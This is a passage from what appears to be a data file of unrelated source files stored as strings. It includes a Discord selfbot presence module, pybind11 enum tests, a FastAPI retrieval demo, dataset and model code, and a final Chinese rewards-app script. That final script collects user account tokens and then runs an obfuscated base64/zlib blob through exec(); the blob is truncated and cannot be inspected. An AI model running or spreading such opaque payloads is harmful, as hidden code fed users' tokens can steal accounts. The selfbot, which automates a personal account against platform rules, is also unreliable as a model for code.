f\"\\n\\n{document}\"\n\n\ndef setup_new_document_format(document_title: str, document_description: str, original_question: str) -> str:\n    \"\"\"Process to set the document title for creating an MD file\"\"\"\n    return f\"# {document_title}\\n\\n## {original_question}\\n\\n{document_description}\\n\\n\\n\"\n\n\ndef save_document_to_md(full_document: str, document_title: str):\n    \"\"\"After confirming with the user whether to save the file, creates a markdown file with the document_title as the filename inside the src folder\n    Args:\n        full_document: The combined value of each agent's results generated through the parse_result_to_document_format function\n        document_title: The document title generated by the LLM in the O stage of THLO\n    Returns:\n        None\n    \"\"\"\n    print(\"#####DOCUMENT#####\\n\\n\")\n    print(full_document)\n    print(\"#####DOCUMENT#####\\n\\n\")\n\n    user_response = input('[y/n] Would you want to save this document as a .md file?: ')\n    if user_response.lower() == 'y':\n        # create file name\n        file_name = f\"{document_title}.md\"\n\n        parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))\n\n        file_path = os.path.join(parent_dir, \"src\", file_name)\n\n        with open(file_path, \"w\", encoding=\"utf-8\") as file:\n            file.write(full_document)\n\n        print(f\"DOCUMENT SAVED AS {file_name} SUCCESSFULLY\")\n    else:\n        print(\"DOCUMENT NOT SAVED.\")",
    "import discord\r\nfrom discord.ext import commands\r\nimport datetime\r\nimport time\r\nimport asyncio\r\nimport rpc\r\n\r\nimport config_selfbot\r\nimport langs\r\n\r\nclass TemplatesCommands(commands.Cog):\r\n    def __init__(self, bot):\r\n        self.bot: commands.Bot = bot\r\n        self.templates_assets = rpc.get_raw_json(\"Sitois\", \"Nuclear-V2\", \"assets.json\")\r\n\r\n    @commands.command()\r\n    async def use(self, ctx):\r\n        today_date = datetime.datetime.today()\r\n        choice = ctx.message.content.split()[1]\r\n        if choice.lower() == \"hi\":\r\n            assets = {\"large_image\": self.templates_assets[\"hi\"][\"large_image\"],\r\n                      \"large_text\": \"heyyy\",\r\n                      \"small_image\": self.templates_assets[\"hi\"][\"small_image\"],\r\n                      \"small_text\": \"hiii\"\r\n                      }\r\n            activity = discord.Activity(type=discord.ActivityType.playing,\r\n                                        name=\"Hi !\",\r\n                                        details=\"hi !!!!!!\",\r\n                                        state=None,\r\n                                        timestamps={\"start\": time.time()},\r\n                                        assets=assets,\r\n                                        application_id=1193291951290712154,\r\n                                        buttons=[config_selfbot.activity_button_one if rpc.read_variable_json(\"activity_button_one\") == \"VOID\" else rpc.read_variable_json(\"activity_button_one\"), config_selfbot.activity_button_two if rpc.read_variable_json(\"activity_button_two\") == \"VOID\" else rpc.read_variable_json(\"activity_button_two\")])\r\n            \r\n            await self.bot.change_presence(status=discord.Status.idle,\r\n                                    activity=activity,\r\n                                    afk=True,\r\n                                    idle_since=datetime.datetime(today_date.year, today_date.month, today_date.day))\r\n            \r\n            await ctx.message.edit(\"\ud83d\udc4b Template \\\"hi !\\\".\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        elif choice.lower() == \"omori\":\r\n            assets = {\"large_image\": self.templates_assets[\"omori\"][\"large_image\"],\r\n                      \"large_text\": \"Omori\",\r\n                      \"small_image\": self.templates_assets[\"omori\"][\"small_image\"],\r\n                      \"small_text\": \"The bulb.\"\r\n                      }\r\n            activity = discord.Activity(type=discord.ActivityType.playing,\r\n                                        name=\"Omori\",\r\n                                        details=\"In Game\",\r\n                                        state=\"Fighting a boss.\",\r\n                                        timestamps={\"start\": time.time()},\r\n                                        assets=assets,\r\n                                        application_id=1193291951290712154,\r\n                                        buttons=[config_selfbot.activity_button_one if rpc.read_variable_json(\"activity_button_one\") == \"VOID\" else rpc.read_variable_json(\"activity_button_one\"), config_selfbot.activity_button_two if rpc.read_variable_json(\"activity_button_two\") == \"VOID\" else rpc.read_variable_json(\"activity_button_two\")])\r\n            \r\n            await self.bot.change_presence(status=discord.Status.idle,\r\n                                    activity=activity,\r\n                                    afk=True,\r\n                                    idle_since=datetime.datetime(today_date.year, today_date.month, today_date.day))\r\n\r\n            await ctx.message.edit(\"\ud83d\udca1 Template \\\"Omori\\\".\")\r\n            await asyncio.sleep(config_selfbot.deltime)\r\n            await ctx.message.delete()\r\n        elif choice.lower() == \"cod\":\r\n            assets = {\"large_image\": self.templates_assets[\"cod\"][\"large_image\"],\r\n                      \"large_text\": \"Call Of Duty: MWIII\",\r\n                      \"small_image\": self.templates_assets[\"cod\"][\"small_image\"],\r\n                      \"small_text\": \"Battle Pass level 21\"\r\n                      }\r\n            activity = discord.Activity(type=discord.ActivityType.playing,\r\n                                        name=\"Call Of Duty: MWIII\",\r\n                                        details=langs.rpc_cod_details[config_selfbot.lang],\r\n                                        state=langs.rpc_cod_state[config_selfbot.lang],\r\n                                        timestamps={\"start\": time.time()},\r\n                                        assets=assets,\r\n                                        application_id=1193291951290712154,\r\n                                        buttons=[config_selfbot.activity_button_one if rpc.read_variable_json(\"activity_button_one\") == \"VOID\" else rpc.read_variable_json(\"activity_button_one\"), config_selfbot.activity_button_two if rpc.read_variable_json(\"activity_button_two\") == \"VOID\" else rpc.read_variable_json(\"activity_button_two\")])\r\n            \r\n            await self.bot.change_presence(status=discord.",
    "# -*- coding: utf-8 -*-\nimport pytest\nfrom pybind11_tests import enums as m\n\n\ndef test_unscoped_enum():\n    assert str(m.UnscopedEnum.EOne) == \"UnscopedEnum.EOne\"\n    assert str(m.UnscopedEnum.ETwo) == \"UnscopedEnum.ETwo\"\n    assert str(m.EOne) == \"UnscopedEnum.EOne\"\n    assert repr(m.UnscopedEnum.EOne) == \"<UnscopedEnum.EOne: 1>\"\n    assert repr(m.UnscopedEnum.ETwo) == \"<UnscopedEnum.ETwo: 2>\"\n    assert repr(m.EOne) == \"<UnscopedEnum.EOne: 1>\"\n\n    # name property\n    assert m.UnscopedEnum.EOne.name == \"EOne\"\n    assert m.UnscopedEnum.ETwo.name == \"ETwo\"\n    assert m.EOne.name == \"EOne\"\n    # name readonly\n    with pytest.raises(AttributeError):\n        m.UnscopedEnum.EOne.name = \"\"\n    # name returns a copy\n    foo = m.UnscopedEnum.EOne.name\n    foo = \"bar\"\n    assert m.UnscopedEnum.EOne.name == \"EOne\"\n\n    # __members__ property\n    assert m.UnscopedEnum.__members__ == \\\n        {\"EOne\": m.UnscopedEnum.EOne, \"ETwo\": m.UnscopedEnum.ETwo, \"EThree\": m.UnscopedEnum.EThree}\n    # __members__ readonly\n    with pytest.raises(AttributeError):\n        m.UnscopedEnum.__members__ = {}\n    # __members__ returns a copy\n    foo = m.UnscopedEnum.__members__\n    foo[\"bar\"] = \"baz\"\n    assert m.UnscopedEnum.__members__ == \\\n        {\"EOne\": m.UnscopedEnum.EOne, \"ETwo\": m.UnscopedEnum.ETwo, \"EThree\": m.UnscopedEnum.EThree}\n\n    for docstring_line in '''An unscoped enumeration\n\nMembers:\n\n  EOne : Docstring for EOne\n\n  ETwo : Docstring for ETwo\n\n  EThree : Docstring for EThree'''.split('\\n'):\n        assert docstring_line in m.UnscopedEnum.__doc__\n\n    # Unscoped enums will accept ==/!= int comparisons\n    y = m.UnscopedEnum.ETwo\n    assert y == 2\n    assert 2 == y\n    assert y != 3\n    assert 3 != y\n    # Compare with None\n    assert (y != None)  # noqa: E711\n    assert not (y == None)  # noqa: E711\n    # Compare with an object\n    assert (y != object())\n    assert not (y == object())\n    # Compare with string\n    assert y != \"2\"\n    assert \"2\" != y\n    assert not (\"2\" == y)\n    assert not (y == \"2\")\n\n    with pytest.raises(TypeError):\n        y < object()\n\n    with pytest.raises(TypeError):\n        y <= object()\n\n    with pytest.raises(TypeError):\n        y > object()\n\n    with pytest.raises(TypeError):\n        y >= object()\n\n    with pytest.raises(TypeError):\n        y | object()\n\n    with pytest.raises(TypeError):\n        y & object()\n\n    with pytest.raises(TypeError):\n        y ^ object()\n\n    assert int(m.UnscopedEnum.ETwo) == 2\n    assert str(m.UnscopedEnum(2)) == \"UnscopedEnum.ETwo\"\n\n    # order\n    assert m.UnscopedEnum.EOne < m.UnscopedEnum.ETwo\n    assert m.UnscopedEnum.EOne < 2\n    assert m.UnscopedEnum.ETwo > m.UnscopedEnum.EOne\n    assert m.UnscopedEnum.ETwo > 1\n    assert m.UnscopedEnum.ETwo <= 2\n    assert m.UnscopedEnum.ETwo >= 2\n    assert m.UnscopedEnum.EOne <= m.UnscopedEnum.ETwo\n    assert m.UnscopedEnum.EOne <= 2\n    assert m.UnscopedEnum.ETwo >= m.UnscopedEnum.EOne\n    assert m.UnscopedEnum.ETwo >= 1\n    assert not (m.UnscopedEnum.ETwo < m.UnscopedEnum.EOne)\n    assert not (2 < m.UnscopedEnum.EOne)\n\n    # arithmetic\n    assert m.UnscopedEnum.EOne & m.UnscopedEnum.EThree == m.UnscopedEnum.EOne\n    assert m.UnscopedEnum.EOne | m.UnscopedEnum.ETwo == m.UnscopedEnum.EThree\n    assert m.UnscopedEnum.EOne ^ m.UnscopedEnum.EThree == m.UnscopedEnum.ETwo\n\n\ndef test_scoped_enum():\n    assert m.test_scoped_enum(m.ScopedEnum.Three) == \"ScopedEnum::Three\"\n    z = m.ScopedEnum.Two\n    assert m.test_scoped_enum(z) == \"ScopedEnum::Two\"\n\n    # Scoped enums will *NOT* accept ==/!= int comparisons (Will always return False)\n    assert not z == 3\n    assert not 3 == z\n    assert z != 3\n    assert 3 != z\n    # Compare with None\n    assert (z != None)  # noqa: E711\n    assert not (z == None)  # noqa: E711\n    # Compare with an object\n    assert (z != object())\n    assert not (z == object())\n    # Scoped enums will *NOT* accept >, <, >= and <= int comparisons (Will throw exceptions)\n    with pytest.raises(TypeError):\n        z > 3\n    with pytest.raises(TypeError):\n        z < 3\n    with pytest.raises(TypeError):\n        z >= 3\n    with pytest.raises(TypeError):\n        z <= 3\n\n    # order\n    assert m.ScopedEnum.Two < m.ScopedEnum.Three\n    assert m.ScopedEnum.Three > m.ScopedEnum.Two\n    assert m.ScopedEnum.Two <= m.ScopedEnum.Three\n    assert m.ScopedEnum.Two <= m.ScopedEnum.Two\n    assert m.ScopedEnum.Two >= m.ScopedEnum.Two\n    assert m.ScopedEnum.Three >= m.ScopedEnum.Two\n\n\ndef test_implicit_conversion():\n    assert str(m.ClassWithUnscopedEnum.EMode.EFirstMode) == \"EMode.EFirstMode\"\n    assert str(m.ClassWithUnscopedEnum.EFirstMode) == \"EMode.EFirstMode\"\n    assert repr(m.ClassWithUnscopedEnum.EMode.EFirstMode) == \"<EMode.EFirstMode: 1>\"\n    assert repr(m.ClassWithUnscopedEnum.EFirstMode) == \"<EMode.EFirstMode: 1>\"\n\n    f = m.ClassWithUnscopedEnum.test_function\n    first = m.ClassWithUnscopedEnum.EFirstMode\n    second = m.ClassWithUnscopedEnum.ESecondMode\n\n    assert f(first) == 1\n\n    assert f(first) == f(first)\n  ",
    "from fastapi import FastAPI\nfrom fastapi.responses import StreamingResponse, FileResponse\nfrom langchain_openai import ChatOpenAI\nfrom dotenv import load_dotenv\nfrom langchain.schema import Document\nfrom langchain_openai import OpenAIEmbeddings\nfrom langchain_community.vectorstores.chroma import Chroma\nfrom langchain_core.runnables import RunnablePassthrough\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_core.output_parsers import StrOutputParser\n\n\nload_dotenv()\n\nembedding_function = OpenAIEmbeddings()\n\ndocs = [\n    Document(\n        page_content=\"the dog loves to eat pizza\", metadata={\"source\": \"animal.txt\"}\n    ),\n    Document(\n        page_content=\"the cat loves to eat lasagna\", metadata={\"source\": \"animal.txt\"}\n    ),\n]\n\ndb = Chroma.from_documents(docs, embedding_function)\nretriever = db.as_retriever()\n\n\ntemplate = \"\"\"Answer the question based only on the following context:\n{context}\n\nQuestion: {question}\n\"\"\"\nprompt = ChatPromptTemplate.from_template(template)\nmodel = ChatOpenAI(temperature=0, streaming=True)\n\nretrieval_chain = (\n    {\"context\": retriever, \"question\": RunnablePassthrough()}\n    | prompt\n    | model\n    | StrOutputParser()\n)\n\napp = FastAPI()\n\nasync def generate_chat_responses(message):\n    async for chunk in retrieval_chain.astream(message):\n        content = chunk.replace(\"\\n\", \"<br>\")\n        yield f\"data: {content}\\n\\n\"\n\n\n@app.get(\"/\")\nasync def root():\n    return FileResponse(\"static/index.html\")\n\n\n@app.get(\"/chat_stream/{message}\")\nasync def chat_stream(message: str):\n    return StreamingResponse(generate_chat_responses(message=message), media_type=\"text/event-stream\")\n\n\nif __name__ == \"__main__\":\n    import uvicorn\n\n    uvicorn.run(app, host=\"0.0.0.0\", port=8000)\n",
    "from lib2to3.pgen2 import token\nimport os\nimport torch\nimport numpy as np\nimport shutil\nimport struct\nfrom functools import lru_cache\nfrom itertools import accumulate\n\ndef print_rank_0(*message):\n    pass\n    # \"\"\"If distributed is initialized print only on rank 0.\"\"\"\n    # if torch.distributed.is_initialized():\n    #     if torch.distributed.get_rank() == 0:\n    #         print(*message, flush=True)\n    # else:\n    #     print(*message, flush=True)\n\ndef _warmup_mmap_file(path):\n    pass\n    # with open(path, \"rb\") as stream:\n    #     while stream.read(100 * 1024 * 1024):\n    #         pass\n\ndtypes = {\n    1: np.uint8,\n    2: np.int8,\n    3: np.int16,\n    4: np.int32,\n    5: np.int64,\n    6: float,\n    7: np.double,\n    8: np.uint16,\n}\n\ndef code(dtype):\n    for k in dtypes.keys():\n        if dtypes[k] == dtype:\n            return k\n    raise ValueError(dtype)\n\ndef index_file_path(prefix_path):\n    return prefix_path + \".idx\"\n\ndef data_file_path(prefix_path):\n    return prefix_path + \".bin\"\n\nclass MMapIndexedDataset(torch.utils.data.Dataset):\n    class Index(object):\n        _HDR_MAGIC = b\"MMIDIDX\\x00\\x00\"\n\n        @classmethod\n        def writer(cls, path, dtype):\n            class _Writer(object):\n                def __enter__(self):\n                    self._file = open(path, \"wb\")\n\n                    # Write Magic string so we can check the file format then opening it again.\n                    self._file.write(cls._HDR_MAGIC)\n                    # Write version number\n                    # Little endian unsigned 64 Bit integer\n                    self._file.write(struct.pack(\"<Q\", 1))\n                    # Little endian unsigned 8 Bit integer\n                    self._file.write(struct.pack(\"<B\", code(dtype)))\n\n                    return self\n\n                @staticmethod\n                def _get_pointers(sizes):\n                    dtype_size = dtype().itemsize\n                    address = 0\n                    pointers = []\n\n                    for size in sizes:\n                        pointers.append(address)\n                        address += size * dtype_size\n\n                    return pointers\n\n                def write(self, sizes, doc_idx):\n                    pointers = self._get_pointers(sizes)\n\n                    # Little endian unsigned 64 Bit integer\n                    self._file.write(struct.pack(\"<Q\", len(sizes)))\n                    # Little endian unsigned 64 Bit integer\n                    self._file.write(struct.pack(\"<Q\", len(doc_idx)))\n\n                    sizes = np.array(sizes, dtype=np.int32)\n                    self._file.write(sizes.tobytes(order=\"C\"))\n                    del sizes\n\n                    pointers = np.array(pointers, dtype=np.int64)\n                    self._file.write(pointers.tobytes(order=\"C\"))\n                    del pointers\n\n                    doc_idx = np.array(doc_idx, dtype=np.int64)\n                    self._file.write(doc_idx.tobytes(order=\"C\"))\n\n                def __exit__(self, exc_type, exc_val, exc_tb):\n                    self._file.close()\n\n            return _Writer()\n        \n        def __init__(self, path, skip_warmup=False):\n            with open(path, \"rb\") as stream:\n                magic_test = stream.read(9)\n                assert self._HDR_MAGIC == magic_test, (\n                    \"Index file doesn't match expected format. \"\n                    \"Make sure that --dataset-impl is configured properly.\"\n                )\n                # Little endian unsigned 64 Bit integer\n                version = struct.unpack(\"<Q\", stream.read(8))\n                assert (1,) == version\n\n                # Little endian unsigned 8 Bit integer\n                (dtype_code,) = struct.unpack(\"<B\", stream.read(1))\n                self._dtype = dtypes[dtype_code]\n                self._dtype_size = self._dtype().itemsize\n\n                self._len = struct.unpack(\"<Q\", stream.read(8))[0]\n                self._doc_count = struct.unpack(\"<Q\", stream.read(8))[0]\n                offset = stream.tell()\n\n            if not skip_warmup:\n                print_rank_0(\"    warming up index mmap file...\")\n                _warmup_mmap_file(path)\n\n            self._bin_buffer_mmap = np.memmap(path, mode=\"r\", order=\"C\")\n            self._bin_buffer = memoryview(self._bin_buffer_mmap)\n            print_rank_0(\"    reading sizes...\")\n            self._sizes = np.frombuffer(\n                self._bin_buffer, dtype=np.int32, count=self._len, offset=offset\n            )\n            print_rank_0(\"    reading pointers...\")\n            self._pointers = np.frombuffer(\n                self._bin_buffer,\n                dtype=np.int64,\n                count=self._len,\n                offset=offset + self._sizes.nbytes,\n            )\n            print_rank_0(\"    reading document index...\")\n            self._doc_idx = np.frombuffer(\n                self._bin_buffer,\n                dtype=np.int64,\n                count=self._doc_count,\n                offset=offset + self._si",
    "# Adapted from https://github.com/huggingface/diffusers/blob/main/src/diffusers/models/attention.py\n\nfrom dataclasses import dataclass\nfrom typing import Optional\n\nimport torch\nfrom torch import nn\n\nfrom diffusers.configuration_utils import ConfigMixin, register_to_config\nfrom diffusers.models.modeling_utils import ModelMixin\nfrom diffusers.utils import BaseOutput\nfrom diffusers.models.attention import BasicTransformerBlock\nfrom einops import rearrange, repeat\n\n\n@dataclass\nclass Transformer3DModelOutput(BaseOutput):\n    sample: torch.FloatTensor\n\n\nclass Transformer3DModel(ModelMixin, ConfigMixin):\n    @register_to_config\n    def __init__(\n            self,\n            num_attention_heads: int = 16,\n            attention_head_dim: int = 88,\n            in_channels: Optional[int] = None,\n            num_layers: int = 1,\n            dropout: float = 0.0,\n            norm_num_groups: int = 32,\n            cross_attention_dim: Optional[int] = None,\n            attention_bias: bool = False,\n            activation_fn: str = \"geglu\",\n            num_embeds_ada_norm: Optional[int] = None,\n            use_linear_projection: bool = False,\n            only_cross_attention: bool = False,\n            upcast_attention: bool = False,\n            norm_type: str = \"layer_norm\",\n            norm_elementwise_affine: bool = True,\n    ):\n        super().__init__()\n        self.use_linear_projection = use_linear_projection\n        self.num_attention_heads = num_attention_heads\n        self.attention_head_dim = attention_head_dim\n        inner_dim = num_attention_heads * attention_head_dim\n\n        # Define input layers\n        self.in_channels = in_channels\n\n        self.norm = torch.nn.GroupNorm(num_groups=norm_num_groups, num_channels=in_channels, eps=1e-6, affine=True)\n        if use_linear_projection:\n            self.proj_in = nn.Linear(in_channels, inner_dim)\n        else:\n            self.proj_in = nn.Conv2d(in_channels, inner_dim, kernel_size=1, stride=1, padding=0)\n\n        # Define transformers blocks\n        self.transformer_blocks = nn.ModuleList(\n            [\n                BasicTransformerBlock(\n                    inner_dim,\n                    num_attention_heads,\n                    attention_head_dim,\n                    dropout=dropout,\n                    cross_attention_dim=cross_attention_dim,\n                    activation_fn=activation_fn,\n                    num_embeds_ada_norm=num_embeds_ada_norm,\n                    attention_bias=attention_bias,\n                    only_cross_attention=only_cross_attention,\n                    upcast_attention=upcast_attention,\n                    norm_type=norm_type,\n                    norm_elementwise_affine=norm_elementwise_affine,\n                )\n                for d in range(num_layers)\n            ]\n        )\n\n        # 4. Define output layers\n        if use_linear_projection:\n            self.proj_out = nn.Linear(in_channels, inner_dim)\n        else:\n            self.proj_out = nn.Conv2d(inner_dim, in_channels, kernel_size=1, stride=1, padding=0)\n\n    def forward(self, hidden_states, encoder_hidden_states=None, timestep=None, return_dict: bool = True):\n        # Input\n        assert hidden_states.dim() == 5, f\"Expected hidden_states to have ndim=5, but got ndim={hidden_states.dim()}.\"\n        batch_size, _, video_length = hidden_states.shape[:3]\n        hidden_states = rearrange(hidden_states, \"b c f h w -> (b f) c h w\")\n\n        if encoder_hidden_states.shape[0] == batch_size:\n            encoder_hidden_states = repeat(encoder_hidden_states, 'b n c -> (b f) n c', f=video_length)\n\n        elif encoder_hidden_states.shape[0] == batch_size * video_length:\n            pass\n        else:\n            raise ValueError\n\n        batch, channel, height, weight = hidden_states.shape\n        residual = hidden_states\n\n        hidden_states = self.norm(hidden_states)\n        if not self.use_linear_projection:\n            hidden_states = self.proj_in(hidden_states)\n            inner_dim = hidden_states.shape[1]\n            hidden_states = hidden_states.permute(0, 2, 3, 1).reshape(batch, height * weight, inner_dim)\n        else:\n            inner_dim = hidden_states.shape[1]\n            hidden_states = hidden_states.permute(0, 2, 3, 1).reshape(batch, height * weight, inner_dim)\n            hidden_states = self.proj_in(hidden_states)\n\n        # Blocks\n        for block in self.transformer_blocks:\n            hidden_states = block(\n                hidden_states,\n                encoder_hidden_states=encoder_hidden_states,\n                timestep=timestep,\n            )\n\n        # Output\n        if not self.use_linear_projection:\n            hidden_states = (\n                hidden_states.reshape(batch, height, weight, inner_dim).permute(0, 3, 1, 2).contiguous()\n            )\n            hidden_states = self.proj_out(hidden_states)\n        else:\n            hidden_states = self.proj_out(hidden_states)\n            hidden_states = (\n                hidden_states.reshape(batc",
    "import torch\n\n\ndef swap_coords_xy(coords):\n    coords_swap = torch.empty_like(coords)\n    coords_swap[..., 0] = coords[..., 1]\n    coords_swap[..., 1] = coords[..., 0]\n    return coords_swap\n\n\n# Transforms pixel coordiantes to [-1,1] assuming pixels are at fractional coordinates\ndef normalize_coordinates(x_pixel, dims):\n    A = 1.0 / torch.as_tensor(dims, device=x_pixel.device, dtype=x_pixel.dtype)\n    x_norm = 2 * A * x_pixel + A - 1\n    return x_norm\n\n\ndef normalize_coordinates_A(x_pixel, A):\n    x_norm = 2 * A * x_pixel + A - 1\n    return x_norm\n\n\ndef unnormalize_coordinates(x_norm, dims):\n    A = torch.as_tensor(dims, device=x_norm.device, dtype=x_norm.dtype) / 2.0\n    x_pixel = A * x_norm + A - 0.5\n    return x_pixel\n\n\ndef get_test_coords(img_size, device, batch_size=1):\n    h, w = img_size\n    y_coords, x_coords = torch.meshgrid(\n        torch.arange(h, device=device), torch.arange(w, device=device), indexing=\"ij\"\n    )\n    test_coords = torch.column_stack((torch.flatten(y_coords), torch.flatten(x_coords)))\n    test_coords = test_coords.repeat(batch_size, 1, 1)\n    return test_coords\n\n\ndef get_coord_img(img_size, device, batch_size=1):\n    h, w = img_size\n    y_coords, x_coords = torch.meshgrid(\n        torch.arange(h, device=device), torch.arange(w, device=device), indexing=\"ij\"\n    )\n    coord_img = (\n        torch.dstack((y_coords, x_coords)).unsqueeze(0).repeat(batch_size, 1, 1, 1)\n    )\n    return coord_img\n\n\ndef fill_image(coords, vals, img_size, default_val=float(\"nan\")):\n    coords_long = coords.long()\n    img = default_val * torch.ones(\n        (1, img_size[0], img_size[1]), device=coords.device, dtype=vals.dtype\n    )\n    img[:, coords_long[..., 0], coords_long[..., 1]] = vals[..., 0]\n    return img\n",
    "#   --------------------------------\u6ce8\u91ca\u533a--------------------------------\n#   \u5165\u53e3:http://r.zsxx.tuesjf.cn?type=1&share_code=DB0LF3\n#   \u6293token\u53c2\n#   \u53d8\u91cf: yuanshen_zsxx \u591a\u53f7\uff1a @\u5206\u5272\n#   \u683c\u5f0f: token\n#   \u665a\u996d \u770b\u5e7f\u544a\u5356\u90a3\u4e2a\u4ec0\u4e48\u7075\u77f3 \u6bcf\u59290.25\u81ea\u5df1\u5356\n#   --------------------------------\u4e00\u822c\u4e0d\u52a8\u533a-------------------------------\n#                     _ooOoo_\n#                    o8888888o\n#                    88\" . \"88\n#                    (| -_- |)\n#                     O\\ = /O\n#                 ____/`---'\\____\n#               .   ' \\\\| |// `.\n#                / \\\\||| : |||// \\\n#              / _||||| -:- |||||- \\\n#                | | \\\\\\ - /// | |\n#              | \\_| ''\\---/'' | |\n#               \\ .-\\__ `-` ___/-. /\n#            ___`. .' /--.--\\ `. . __\n#         .\"\" '< `.___\\_<|>_/___.' >'\"\".\n#        | | : `- \\`.;`\\ _ /`;.`/ - ` : | |\n#          \\ \\ `-. \\_ __\\ /__ _/ .-` / /\n#  ======`-.____`-.___\\_____/___.-`____.-'======\n#                     `=---='\n# \n#  .............................................\n#           \u4f5b\u7956\u4fdd\u4f51             \u6c38\u65e0BUG\n#           \u4f5b\u7956\u9547\u697c             BUG\u8f9f\u90aa\n#\u4f5b\u66f0:  \n#        \u5199\u5b57\u697c\u91cc\u5199\u5b57\u95f4\uff0c\u5199\u5b57\u95f4\u91cc\u7a0b\u5e8f\u5458\uff1b  \n#        \u7a0b\u5e8f\u4eba\u5458\u5199\u7a0b\u5e8f\uff0c\u53c8\u62ff\u7a0b\u5e8f\u6362\u9152\u94b1\u3002  \n#        \u9152\u9192\u53ea\u5728\u7f51\u4e0a\u5750\uff0c\u9152\u9189\u8fd8\u6765\u7f51\u4e0b\u7720\uff1b  \n#        \u9152\u9189\u9152\u9192\u65e5\u590d\u65e5\uff0c\u7f51\u4e0a\u7f51\u4e0b\u5e74\u590d\u5e74\u3002  \n#        \u4f46\u613f\u8001\u6b7b\u7535\u8111\u95f4\uff0c\u4e0d\u613f\u97a0\u8eac\u8001\u677f\u524d\uff1b  \n#        \u5954\u9a70\u5b9d\u9a6c\u8d35\u8005\u8da3\uff0c\u516c\u4ea4\u81ea\u884c\u7a0b\u5e8f\u5458\u3002  \n#        \u522b\u4eba\u7b11\u6211\u5fd2\u75af\u766b\uff0c\u6211\u7b11\u81ea\u5df1\u547d\u592a\u8d31\uff1b  \n#        \u4e0d\u89c1\u6ee1\u8857\u6f02\u4eae\u59b9\uff0c\u54ea\u4e2a\u5f52\u5f97\u7a0b\u5e8f\u5458\uff1f\n#\n#   --------------------------------\u4ee3\u7801\u533a--------------------------------\nimport zlib, base64\nexec(zlib.decompress(base64.b64decode('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